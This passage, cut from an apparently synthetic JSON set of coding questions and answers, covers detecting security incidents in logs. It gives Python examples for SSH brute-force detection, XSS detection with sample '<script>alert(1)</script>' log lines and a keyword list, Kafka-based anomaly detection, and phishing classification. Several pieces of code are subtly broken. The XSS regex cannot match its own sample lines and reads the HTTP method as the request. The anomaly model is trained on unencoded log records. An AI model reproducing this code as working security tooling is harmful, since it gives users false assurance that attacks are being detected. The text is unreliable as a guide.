FailedPasswordForUser user1 /opt/ssh 535 42 /bin/login\",\n    \"192.168.1.1 user1 FailedPasswordForUser user1 /opt/ssh 535 42 /bin/login\",\n    \"192.168.1.1 user1 FailedPasswordForUser user1 /opt/ssh 535 42 /bin/login\",\n    \"192.168.1.1 user1 FailedPasswordForUser user1 /opt/ssh 535 42 /bin/login\",\n    \"192.168.1.2 user2 FailedPasswordForUser user2 /opt/ssh 535 42 /bin/login\"\n]\n\ndetect_brute_force_attacks(log_lines)\n```\n\nQuestion 2:\nProblem: Create a Python script that reads Apache HTTP server logs and flags potential cross-site scripting (XSS) attacks by identifying suspicious user input in URLs.\n\nConcept: Text Processing, Pattern Recognition, Regular Expressions\n\n```python\nimport re\n\ndef parse_log_line(line):\n    pattern = r'(\\S+) (\\S+) (\\S+) \\[([^\\]]+)\\] \\\"(\\S+) (\\S+) \\\"(\\d+) (\\S+) \\\"([^\\\"]*)\\\" \\\"([^\\\"]*)\\\"'\n    match = re.match(pattern, line)\n    if match:\n        return {\n            'timestamp': match.group(4),\n            'request': match.group(5)\n        }\n    return None\n\ndef detect_xss_attacks(log_lines, suspicious_terms=['<script>', '</script>', 'javascript:']):\n    for line in log_lines:\n        log_entry = parse_log_line(line)\n        if log_entry:\n            request = log_entry['request']\n            for term in suspicious_terms:\n                if term in request:\n                    print(f'Potential XSS attack detected in URL: {request}')\n\n# Example log lines\nlog_lines = [\n    '127.0.0.1 - frank [10/Oct/2000:13:55:36 -0700] \"GET /apache_pb.gif?x=<script>alert(1)</script> HTTP/1.0\" 200 2326',\n    '127.0.0.1 - frank [10/Oct/2000:13:55:36 -0700] \"GET /apache_pb.gif?y=javascript:alert(2) HTTP/1.0\" 200 2326',\n    '127.0.0.1 - frank [10/Oct/2000:13:55:36 -0700] \"GET /apache_pb.gif?z=normal-param HTTP/1.0\" 200 2326'\n]\n\ndetect_xss_attacks(log_lines)\n```\n\nIn both problems, the script reads log lines, parses relevant information (IP addresses, timestamps, and request details), and then uses pattern recognition and regular expressions to check for security incidents (SSH brute force attacks and XSS attacks)."}, {"L2_TASK": "Log Analysis (Text -> Text)", "L3_TASK": "Security incident detection through logs", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a complex system that can analyze logs in real-time, detecting security incidents by identifying patterns that indicate intrusion, privilege escalation, or data exfiltration. The system should be able to handle large volumes of log data, perform advanced anomaly detection, and integrate with a streaming platform like Apache Kafka for scalability.\n\nSolution:\nConcept: Log Analysis, Real-time Processing, Anomaly Detection, Streaming Data\n\nHere's an example using Python and the libraries `Logstash`, `Kafka`, `ELK Stack (Elasticsearch, Logstash, Kibana)`, and `scikit-learn` for anomaly detection:\n\n```python\nimport json\nimport logging\nfrom kafka import KafkaConsumer\nfrom elasticsearch import Elasticsearch\nfrom sklearn.ensemble import IsolationForest\nfrom datetime import datetime\n\n# Initialize logging\nlogging.basicConfig(level=logging.INFO)\n\n# Connect to Kafka and Elasticsearch\nconsumer = KafkaConsumer(\n    'log-topic',\n    bootstrap_servers=['localhost:9092'],\n    auto_offset_reset='earliest',\n    enable_auto_commit=True,\n    group_id='log_consumer_group'\n)\n\nes = Elasticsearch(['http://localhost:9200'])\n\n# Define anomaly detection model\nanomaly_model = IsolationForest(n_estimators=100, contamination='auto', random_state=42)\n\n# Fetch historical data for model training\nhistoric_logs = es.search(index='historic_logs', size=10000)['hits']['hits']\nhistoric_data = [log['_source']['log_data'] for log in historic_logs]\nanomaly_model.fit(historic_data)\n\nwhile True:\n    for message in consumer:\n        log_data = json.loads(message.value.decode('utf-8'))\n\n        # Perform anomaly detection\n        score = anomaly_model.decision_function([log_data])\n        if score < 0:\n            anomaly_flag = True\n        else:\n            anomaly_flag = False\n\n        # Send data to Elasticsearch for visualization\n        log_entry = {\n            'timestamp': datetime.now().isoformat(),\n            'log_data': log_data,\n            'anomaly_score': score,\n            'anomaly_flag': anomaly_flag\n        }\n        es.index(index='realtime_logs', id=log_entry['timestamp'], body=log_entry)\n\n        # Log incident detected\n        if anomaly_flag:\n            logging.warning(f'Potential security incident detected: {log_entry}')\n\n# Note: This is a simplified example and implementation of anomaly detection should be tailored to specific log patterns.\n```\n\nQuestion 2: Design a log analysis system that uses natural language processing (NLP) and machine learning to detect sophisticated phishing attempts by analyzing the content and context of emails in log data. The system should be able to identify known phishing tactics and generate alerts for unknown or previously unseen threats.\n\nSolution:\nConcept: Log Analysis, Natural Language Processing, Machine Learning, Text Classification\n\nHere's an example using Python, `spaCy` for NLP, `scikit-learn` for machine learning, and `pandas` for data manipulation:\n\n```python\nimport spacy\nimport pandas as pd\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.naive_bayes import MultinomialNB\nfrom sklearn.metrics import classification_report\n\n# Load NLP model\nnlp = spacy.load('en_core_web_sm')\n\n# Load email log data\nlog_data = pd.read_csv('email_logs.csv')\n\n# Preprocess data: tokenize, lemmatize, remove stop words\ndef preprocess_text(text):\n    doc = nlp(text)\n    tokens = [token.lemma_ for token in doc if not token.is_stop and not token.is_punct]\n    return ' '.join(tokens)\n\nlog_data['preprocessed_text'] = log_data['email_content'].apply(preprocess_text)\n\n# Split data into training and testing\nX_train, X_test, y_train, y_test = train_test_split(\n    log_data['preprocessed_text'],\n    log_data['is_phishing'],\n    test_size=0.2,\n    random_state=42\n)\n\n# Vectorize text data\nvectorizer = TfidfVectorizer()\nX_train_vec = vectorizer.fit_transform(X_train)\nX_test_vec = vectorizer.transform(X_test)\n\n# Train a Naive Bayes classifier\nclf = MultinomialNB()\nclf.fit(X_train_vec, y_train)\n\n# Predict on test data\ny_pred = clf.predict(X_test_vec)\n\n# Evaluate model performance\nprint(classification_report(y_test, y_pred))\n\n# Detect new or unseen threats\nnew_email = \"You've won a prize! Click the link to claim it.\"\nnew_email_vec = vectorizer.transform([new_email])\nprediction = clf.predict(new_email_vec)\nprint(f'New email is phishing: {prediction[0]}')\n```\n\nIn both examples, the complexity lies in processing large volumes of log data, performing real-time analysis, and using advanced machine learning techniques to detect anomalies or classify text based on context. The actual implementation would require tailored preprocessing, feature engineering, and model selection based on the specific characteristics of log data and security incidents in the environment."}]